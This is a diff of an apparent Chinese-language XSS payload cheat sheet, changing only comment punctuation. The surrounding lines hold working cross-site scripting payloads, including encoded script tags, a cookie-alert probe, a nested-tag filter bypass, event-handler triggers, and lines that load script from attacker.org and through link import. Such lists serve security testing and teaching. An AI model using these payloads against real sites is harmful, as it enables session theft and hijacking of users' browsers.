@@ -47,10 +47,10 @@
 %3cscript%3ealert("XSS");%3c/script%3e
 &ltscript&gtalert(document.cookie);</script>
 
-//绕过进行一次移除操作：
+//绕过进行一次移除操作:
 <scr<script>ipt>alert("XSS")</scr<script>ipt>
 
-//Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：
+//Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本:
 <script>alert("XSS")</script>
 <script src="http://attacker.org/malicious.js"></script>
 ```
@@ -126,7 +126,7 @@ onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><
 
 <div>
 <div onclick="alert('xss')">
-<div onmouseenter="alert('xss')">   //当用户鼠标移动到 div 上时就会触发我们的代码。
+<div onmouseenter="alert('xss')">   //当用户鼠标移动到 div 上时就会触发我们的代码.
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
 
 <style>
@@ -145,7 +145,7 @@ onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><
 ```
 ```h
 利用link远程包含js文件
-PS：在无CSP的情况下才可以
+PS:在无CSP的情况下才可以
 <link rel=import href="http://127.0.0.1/1.js">
 
 
